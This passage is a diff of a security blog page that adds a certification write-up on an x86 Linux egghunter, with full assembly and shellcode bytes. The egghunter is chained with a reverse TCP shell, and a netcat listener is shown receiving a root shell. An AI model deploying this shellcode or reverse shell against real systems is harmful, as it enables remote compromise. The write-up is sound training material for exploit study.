@@ -9,7 +9,7 @@
   <meta name="author" content="tcunha">
 
   
-  <meta name="description" content="Like the previous bind shell, this one is using the well known socket functions. Given that it is supposed to connect to a remote system, it needs to &hellip;">
+  <meta name="description" content="This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -71,6 +71,414 @@
       
   <header>
     
+      <h1 class="entry-title"><a href="/blog/2018/06/19/slae-0x03-egghunter/">SLAE 0x03: Egghunter</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2018-06-19T23:56:39+00:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>19</span><span class='date-suffix'>th</span>, <span class='date-year'>2018</span></span> <span class='time'>11:56 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><pre><code>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
+
+http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert
+
+Student-ID: SLAE-1154
+</code></pre>
+
+<p>This exercise consisted in using the egghunter technique, which is rather useful when a shellcode is bigger than the available space. On those circumstances, an egg can be planted right before the second stage shellcode which when found by the hunter will be executed.</p>
+
+<p>There is an interesting resource by <a href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf">skape</a> which explains this concept quite well, as well as, various Linux implementations.</p>
+
+<p>The one I came up with is based on his revisited <a href="http://man7.org/linux/man-pages/man2/access.2.html">access(2)</a> system call with some differences. I&rsquo;ve decided to instead use the <a href="http://man7.org/linux/man-pages/man2/rmdir.2.html">rmdir(2)</a> system call and to start on the very first page of the process virtual address space. Even though Linux reserves the first few pages for performance reasons and prevents a process of allocating them to avoid potential security issues related to NULL pointer dereferences on page zero, not starting the search at 0x10000 (see <a href="https://www.kernel.org/doc/Documentation/sysctl/vm.txt">vm.mmap_min_addr</a>) allows shaving off a few bytes.</p>
+
+<p>The <a href="http://man7.org/linux/man-pages/man2/rmdir.2.html">rmdir(2)</a> system call will check if the provided address is valid. If for any reason the address can&rsquo;t be accessed (unmapped, invalid permissions, etc), then EFAULT (-14) is returned, which the egghunter should check for robustness. In that case, the next page (PAGE_SIZE) is tried until addressable memory is found.</p>
+
+<figure class='code'><figcaption><span>retrieving the error code</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>asm-errno EFAULT
+</span><span class='line'>14
+</span><span class='line'>0xfffffffffffffff2
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span>rmdir(2) prototype</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">rmdir</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">pathname</span><span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span>retrieving the system call number and size of page</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>asm-syscall rmdir
+</span><span class='line'><span class="c">#define __NR_rmdir 40</span>
+</span><span class='line'>0x28
+</span><span class='line'><span class="nv">$ </span>getconf PAGE_SIZE
+</span><span class='line'>4096
+</span></code></pre></td></tr></table></div></figure>
+
+
+<pre><code>+----------+--------------------+
+| register |       value        |
++----------+--------------------+
+| eax      | 40                 |
+| ebx      | address to search  |
++----------+--------------------+
+</code></pre>
+
+<p>To avoid repeating the egg twice and save space, the non-executable egg is also calculated on the fly by incrementing its value.</p>
+
+<p>String comparison is done with the scas family, which depending on the direction flag (DF) being set or not it automatically increments or decrements the pointer to the next character. To illustrate this, consider the following program where a string is printed to the screen character by character. This is using the <a href="https://c9x.me/x86/html/file_module_x86_id_101.html">fldz</a> and <a href="https://c9x.me/x86/html/file_module_x86_id_119.html">fstenv</a> instructions to get the absolute address of the string to print:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">global</span> <span class="no">_start</span>
+</span><span class='line'>
+</span><span class='line'><span class="nf">section</span> <span class="no">.text</span>
+</span><span class='line'><span class="nl">direction_print:</span>
+</span><span class='line'>  <span class="nf">pushad</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">al</span><span class="p">,</span> <span class="mi">0x4</span>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">ssize_t</span> <span class="no">write</span><span class="p">(</span><span class="no">int</span><span class="p">,</span> <span class="no">const</span> <span class="no">void</span> <span class="p">*,</span> <span class="no">size_t</span><span class="p">)</span>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">bl</span><span class="p">,</span> <span class="mi">0x1</span>             <span class="err">;</span> <span class="no">fd</span>
+</span><span class='line'>  <span class="nf">lea</span> <span class="no">ecx</span><span class="p">,</span> <span class="err">[</span><span class="no">esp</span> <span class="err">+</span> <span class="mi">0x1c</span><span class="err">]</span>   <span class="err">;</span> <span class="no">buf</span>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">dl</span><span class="p">,</span> <span class="mi">0x1</span>             <span class="err">;</span> <span class="no">count</span>
+</span><span class='line'>  <span class="nf">int</span> <span class="mi">0x80</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nf">popad</span>
+</span><span class='line'>  <span class="nf">ret</span>
+</span><span class='line'>
+</span><span class='line'><span class="nl">_start:</span>
+</span><span class='line'>  <span class="nf">cld</span>                     <span class="err">;</span> <span class="no">clear</span> <span class="no">direction</span> <span class="no">flag</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nf">fldz</span>                    <span class="err">;</span> <span class="no">retrieve</span> <span class="no">the</span> <span class="no">string</span> <span class="no">address</span> <span class="no">via</span> <span class="no">fstenv</span>
+</span><span class='line'>  <span class="nf">jmp</span> <span class="no">direction_pc</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">the</span> <span class="no">string</span> <span class="no">is</span> <span class="mi">4</span> <span class="no">bytes</span> <span class="no">below</span> <span class="no">of</span> <span class="no">fdlz</span>
+</span><span class='line'>  <span class="nl">str:</span> <span class="nf">db</span> <span class="err">&quot;</span><span class="no">this</span> <span class="no">is</span> <span class="no">a</span> <span class="no">string</span><span class="err">&quot;</span><span class="p">,</span> <span class="mi">0xa</span>
+</span><span class='line'>
+</span><span class='line'><span class="nl">direction_loop:</span>
+</span><span class='line'>  <span class="nf">lodsb</span>
+</span><span class='line'>  <span class="nf">call</span> <span class="no">direction_print</span>
+</span><span class='line'>  <span class="nf">loop</span> <span class="no">direction_loop</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">al</span><span class="p">,</span> <span class="mi">0x1</span>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">void</span> <span class="no">exit</span><span class="p">(</span><span class="no">int</span><span class="p">)</span>
+</span><span class='line'>  <span class="nf">int</span> <span class="mi">0x80</span>
+</span><span class='line'>
+</span><span class='line'><span class="nl">direction_pc:</span>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">the</span> <span class="no">FPU</span> <span class="no">structure</span> <span class="no">in</span> <span class="no">memory</span> <span class="no">contains</span> <span class="no">the</span> <span class="no">address</span> <span class="no">of</span> <span class="no">the</span> <span class="no">last</span> <span class="no">FPU</span>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">instruction</span> <span class="no">on</span> <span class="no">byte</span> <span class="mi">0xc</span> <span class="p">(</span><span class="no">the</span> <span class="no">previous</span> <span class="mi">3</span> <span class="no">bytes</span> <span class="no">are</span> <span class="no">composed</span> <span class="no">of</span> <span class="no">the</span>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">control</span><span class="p">,</span> <span class="no">status</span> <span class="no">and</span> <span class="no">tag</span> <span class="no">word</span><span class="p">)</span>
+</span><span class='line'>  <span class="nf">fstenv</span> <span class="err">[</span><span class="no">esp</span> <span class="p">-</span> <span class="mi">0xc</span><span class="err">]</span>
+</span><span class='line'>  <span class="nf">pop</span> <span class="no">ecx</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nf">lea</span> <span class="no">esi</span><span class="p">,</span> <span class="err">[</span><span class="no">ecx</span> <span class="err">+</span> <span class="mi">0x4</span><span class="err">]</span>    <span class="err">;</span> <span class="no">string</span> <span class="no">is</span> <span class="mi">4</span> <span class="no">bytes</span> <span class="no">below</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x11</span>               <span class="err">;</span> <span class="no">string</span> <span class="no">length</span>
+</span><span class='line'>  <span class="nf">pop</span> <span class="no">ecx</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nf">jmp</span> <span class="no">direction_loop</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>asm-compile direction-off.asm
+</span><span class='line'><span class="nv">$ </span>asm-opcodes direction-off
+</span><span class='line'>Shellcode size: 63
+</span><span class='line'><span class="se">\x</span>60<span class="se">\x</span>b0<span class="se">\x</span>04<span class="se">\x</span>b3<span class="se">\x</span>01<span class="se">\x</span>8d<span class="se">\x</span>4c<span class="se">\x</span>24<span class="se">\x</span>1c<span class="se">\x</span>b2<span class="se">\x</span>01<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>61<span class="se">\x</span>c3<span class="se">\x</span>fc<span class="se">\x</span>d9<span class="se">\x</span>ee<span class="se">\x</span>eb<span class="se">\x</span>1d<span class="se">\x</span>74<span class="se">\x</span>68<span class="se">\x</span>69<span class="se">\x</span>73<span class="se">\x</span>20<span class="se">\x</span>69<span class="se">\x</span>73<span class="se">\x</span>20<span class="se">\x</span>61<span class="se">\x</span>20<span class="se">\x</span>73<span class="se">\x</span>74<span class="se">\x</span>72<span class="se">\x</span>69<span class="se">\x</span>6e<span class="se">\x</span>67<span class="se">\x</span>0a<span class="se">\x</span>ac<span class="se">\x</span>e8<span class="se">\x</span>d5<span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\x</span>e2<span class="se">\x</span>f8<span class="se">\x</span>b0<span class="se">\x</span>01<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>9b<span class="se">\x</span>d9<span class="se">\x</span>74<span class="se">\x</span>24<span class="se">\x</span>f4<span class="se">\x</span>59<span class="se">\x</span>8d<span class="se">\x</span>71<span class="se">\x</span>04<span class="se">\x</span>6a<span class="se">\x</span>11<span class="se">\x</span>59<span class="se">\x</span>eb<span class="se">\x</span>e6
+</span><span class='line'><span class="nv">$ </span>./direction-off
+</span><span class='line'>this is a string
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Below, the direction flag (DF) is being set, resulting in the string being printed backwards as expected:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class='diff'><span class='line'>$ diff -u direction-off.asm direction-on.asm
+</span><span class='line'><span class="gd">--- direction-off.asm   2018-06-24 17:20:35.044465700 +0100</span>
+</span><span class='line'><span class="gi">+++ direction-on.asm    2018-06-24 18:54:48.168812600 +0100</span>
+</span><span class='line'><span class="gu">@@ -15,7 +15,7 @@</span>
+</span><span class='line'>        ret
+</span><span class='line'>
+</span><span class='line'> _start:
+</span><span class='line'><span class="gd">-       cld                     ; clear direction flag</span>
+</span><span class='line'><span class="gi">+       std                     ; set direction flag</span>
+</span><span class='line'>
+</span><span class='line'>        fldz                    ; retrieve the string address via fstenv
+</span><span class='line'>        jmp direction_pc
+</span><span class='line'><span class="gu">@@ -39,7 +39,7 @@</span>
+</span><span class='line'>        fstenv [esp - 0xc]
+</span><span class='line'>        pop ecx
+</span><span class='line'>
+</span><span class='line'><span class="gd">-       lea esi, [ecx + 0x4]    ; string is 4 bytes below</span>
+</span><span class='line'><span class="gi">+       lea esi, [ecx + 0x4 + 0x11 - 1] ; string is 4 bytes below</span>
+</span><span class='line'>        push 0x11               ; string length
+</span><span class='line'>        pop ecx
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>asm-compile direction-on.asm
+</span><span class='line'><span class="nv">$ </span>./direction-on
+</span><span class='line'>
+</span><span class='line'>gnirts a si siht<span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Given all of the above, the resulting egghunter shellcode is:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">global</span> <span class="no">_start</span>
+</span><span class='line'>
+</span><span class='line'><span class="nf">section</span> <span class="no">.text</span>
+</span><span class='line'><span class="nl">_start:</span>
+</span><span class='line'>  <span class="nf">cld</span>                     <span class="err">;</span> <span class="no">clear</span> <span class="no">direction</span> <span class="no">flag</span> <span class="no">for</span> <span class="no">scasd</span>
+</span><span class='line'>  <span class="nf">xor</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">ebx</span>
+</span><span class='line'>
+</span><span class='line'><span class="nl">egg_restart:</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x28</span>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">int</span> <span class="no">rmdir</span><span class="p">(</span><span class="no">const</span> <span class="no">char</span> <span class="p">*)</span>
+</span><span class='line'>  <span class="nf">pop</span> <span class="no">eax</span>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">increment</span> <span class="no">ebx</span> <span class="no">to</span> <span class="no">either</span> <span class="no">align</span> <span class="no">a</span> <span class="no">page</span> <span class="no">or</span> <span class="no">check</span> <span class="no">the</span> <span class="no">next</span> <span class="no">address</span>
+</span><span class='line'>  <span class="nf">inc</span> <span class="no">ebx</span>                 <span class="err">;</span> <span class="no">pathname</span>
+</span><span class='line'>  <span class="nf">int</span> <span class="mi">0x80</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nf">cmp</span> <span class="no">al</span><span class="p">,</span> <span class="mi">0xf2</span>            <span class="err">;</span> <span class="no">check</span> <span class="no">for</span> <span class="no">a</span> <span class="no">page</span> <span class="no">fault</span> <span class="no">on</span> <span class="no">the</span> <span class="no">lower</span> <span class="no">bits</span> <span class="no">only</span>
+</span><span class='line'>  <span class="nf">jnz</span> <span class="no">egg_check</span>           <span class="err">;</span> <span class="no">it</span><span class="err">&#39;</span><span class="no">s</span> <span class="no">a</span> <span class="no">valid</span> <span class="no">page</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nf">or</span> <span class="no">bx</span><span class="p">,</span> <span class="mi">0xfff</span>            <span class="err">;</span> <span class="no">not</span> <span class="no">an</span> <span class="no">addressable</span> <span class="no">page</span>
+</span><span class='line'>  <span class="nf">jmp</span> <span class="no">egg_restart</span>         <span class="err">;</span> <span class="no">check</span> <span class="no">the</span> <span class="no">next</span> <span class="no">page</span> <span class="p">(</span><span class="mi">0xfff</span> <span class="err">+</span> <span class="mi">1</span> <span class="err">=</span> <span class="no">PAGE_SIZE</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="nl">egg_check:</span>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">0xcafebabd</span>     <span class="err">;</span> <span class="no">add</span> <span class="no">initial</span> <span class="no">not</span> <span class="no">static</span> <span class="no">egg</span> <span class="no">value</span>
+</span><span class='line'>  <span class="nf">inc</span> <span class="no">eax</span>                 <span class="err">;</span> <span class="no">increment</span> <span class="no">the</span> <span class="no">value</span> <span class="no">to</span> <span class="no">decrease</span> <span class="no">the</span> <span class="no">size</span>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="no">ebx</span>            <span class="err">;</span> <span class="no">compare</span> <span class="no">eax</span> <span class="no">with</span> <span class="no">edi</span>
+</span><span class='line'>  <span class="nf">scasd</span>                   <span class="err">;</span> <span class="no">edi</span> <span class="no">is</span> <span class="no">incremented</span> <span class="no">since</span> <span class="no">the</span> <span class="no">direction</span> <span class="no">flag</span> <span class="no">is</span> <span class="no">zero</span>
+</span><span class='line'>  <span class="nf">jnz</span> <span class="no">egg_restart</span>         <span class="err">;</span> <span class="no">egg</span> <span class="no">not</span> <span class="no">found</span><span class="p">,</span> <span class="no">try</span> <span class="no">the</span> <span class="no">next</span> <span class="no">address</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nf">jmp</span> <span class="no">edi</span>                 <span class="err">;</span> <span class="no">edi</span> <span class="no">points</span> <span class="no">to</span> <span class="no">the</span> <span class="no">shellcode</span> <span class="no">to</span> <span class="no">execute</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>To run the shellcode, like before, the configure command should be issued first, followed by make. The second stage payload can be specified by the STAGE2 variable:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>./configure
+</span><span class='line'>Using listening port: 0x9210
+</span><span class='line'>Using remote host: 0x0101017f
+</span><span class='line'>Using remote port: 0x9210
+</span><span class='line'><span class="nv">$ </span><span class="nb">cd </span>0x03-egghunter/
+</span><span class='line'><span class="nv">$ STAGE2</span><span class="o">=</span>../0x02-reverse/reverse make
+</span><span class='line'>nasm  -f elf32 -o egghunter.o egghunter.asm
+</span><span class='line'>ld -N -zexecstack -o egghunter egghunter.o
+</span><span class='line'><span class="m">08048060</span> &lt;_start&gt;:
+</span><span class='line'> 8048060:       <span class="nb">fc                      </span>cld
+</span><span class='line'> 8048061:       <span class="m">31</span> db                   xor    ebx,ebx
+</span><span class='line'>
+</span><span class='line'><span class="m">08048063</span> &lt;egg_restart&gt;:
+</span><span class='line'> 8048063:       6a <span class="m">28</span>                   push   0x28
+</span><span class='line'> 8048065:       <span class="m">58</span>                      pop    eax
+</span><span class='line'> 8048066:       <span class="m">43</span>                      inc    ebx
+</span><span class='line'> 8048067:       <span class="nb">cd </span><span class="m">80</span>                   int    0x80
+</span><span class='line'> 8048069:       3c f2                   cmp    al,0xf2
+</span><span class='line'> 804806b:       <span class="m">75</span> <span class="m">07</span>                   jne    <span class="m">8048074</span> &lt;egg_check&gt;
+</span><span class='line'> 804806d:       <span class="m">66</span> <span class="m">81</span> cb ff 0f          or     bx,0xfff
+</span><span class='line'> 8048072:       eb ef                   jmp    <span class="m">8048063</span> &lt;egg_restart&gt;
+</span><span class='line'>
+</span><span class='line'><span class="m">08048074</span> &lt;egg_check&gt;:
+</span><span class='line'> 8048074:       b8 bd ba fe ca          mov    eax,0xcafebabd
+</span><span class='line'> 8048079:       <span class="m">40</span>                      inc    eax
+</span><span class='line'> 804807a:       <span class="m">89</span> df                   mov    edi,ebx
+</span><span class='line'> 804807c:       af                      scas   eax,DWORD PTR es:<span class="o">[</span>edi<span class="o">]</span>
+</span><span class='line'> 804807d:       <span class="m">75</span> e4                   jne    <span class="m">8048063</span> &lt;egg_restart&gt;
+</span><span class='line'> 804807f:       ff e7                   jmp    edi
+</span><span class='line'>Shellcode size: 33
+</span><span class='line'><span class="se">\x</span>fc<span class="se">\x</span>31<span class="se">\x</span>db<span class="se">\x</span>6a<span class="se">\x</span>28<span class="se">\x</span>58<span class="se">\x</span>43<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>3c<span class="se">\x</span>f2<span class="se">\x</span>75<span class="se">\x</span>07<span class="se">\x</span>66<span class="se">\x</span>81<span class="se">\x</span>cb<span class="se">\x</span>ff<span class="se">\x</span>0f<span class="se">\x</span>eb<span class="se">\x</span>ef<span class="se">\x</span>b8<span class="se">\x</span>bd<span class="se">\x</span>ba<span class="se">\x</span>fe<span class="se">\x</span>ca<span class="se">\x</span>40<span class="se">\x</span>89<span class="se">\x</span>df<span class="se">\x</span>af<span class="se">\x</span>75<span class="se">\x</span>e4<span class="se">\x</span>ff<span class="se">\x</span>e7
+</span><span class='line'>cc -DEGGHUNTER<span class="o">=</span><span class="sb">`</span>asm-opcodes egghunter<span class="sb">`</span> -DSHELLCODE<span class="o">=</span><span class="sb">`</span>asm-opcodes ../0x02-reverse/reverse<span class="sb">`</span> -W -Wall -fno-stack-protector -zexecstack -o shellcode skel.c
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>nc -lv 127.1.1.1 4242
+</span><span class='line'>Listening on <span class="o">[</span>127.1.1.1<span class="o">]</span> <span class="o">(</span>family 0, port 4242<span class="o">)</span>
+</span><span class='line'>Connection from localhost <span class="m">51918</span> received!
+</span><span class='line'>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span><span class='line'><span class="c"># ./shellcode</span>
+</span><span class='line'>Egghunter length: 33
+</span><span class='line'>Shellcode length: 74
+</span></code></pre></td></tr></table></div></figure>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
       <h1 class="entry-title"><a href="/blog/2018/05/21/slae-0x02-reverse-tcp-shell/">SLAE 0x02: Reverse TCP Shell</a></h1>
     
     
@@ -87,7 +495,14 @@
   </header>
 
 
-  <div class="entry-content"><p>Like the previous bind shell, this one is using the well known socket functions. Given that it is supposed to connect to a remote system, it needs to call the <a href="http://man7.org/linux/man-pages/man2/accept.2.html">connect(2)</a> function instead of accepting. There&rsquo;s also no need of binding, since the kernel will automatically choose an ephemeral port and determine the source IP address.</p>
+  <div class="entry-content"><pre><code>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
+
+http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert
+
+Student-ID: SLAE-1154
+</code></pre>
+
+<p>Like the previous bind shell, this one is using the well known socket functions. Given that it is supposed to connect to a remote system, it needs to call the <a href="http://man7.org/linux/man-pages/man2/accept.2.html">connect(2)</a> function instead of accepting. There&rsquo;s also no need of binding, since the kernel will automatically choose an ephemeral port and determine the source IP address.</p>
 
 <figure class='code'><figcaption><span>connect(2) prototype</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">connect</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="n">addr</span><span class="p">,</span> <span class="kt">socklen_t</span> <span class="n">addrlen</span><span class="p">);</span>
@@ -522,6 +937,7 @@
 <span class='line-number'>52</span>
 <span class='line-number'>53</span>
 <span class='line-number'>54</span>
+<span class='line-number'>55</span>
 </pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>./configure -h 127.2.2.2 -r 1337
 </span><span class='line'>Using remote host: 0x0202027f
 </span><span class='line'>Using listening port: 0x9210
@@ -537,7 +953,7 @@
 </span><span class='line'><span class="nv">$ </span><span class="nb">cd </span>0x02-reverse/
 </span><span class='line'><span class="nv">$ </span>make
 </span><span class='line'>nasm  -f elf32 -o reverse.o reverse.asm
-</span><span class='line'>ld  -o reverse reverse.o
+</span><span class='line'>ld -N -zexecstack -o reverse reverse.o
 </span><span class='line'><span class="m">08048060</span> &lt;_start&gt;:
 </span><span class='line'> 8048060:       <span class="m">31</span> c0                   xor    eax,eax
 </span><span class='line'> 8048062:       <span class="m">99</span>                      cdq
@@ -576,6 +992,7 @@
 </span><span class='line'> 80480a4:       <span class="nb">cd </span><span class="m">80</span>                   int    0x80
 </span><span class='line'>Shellcode size: 70
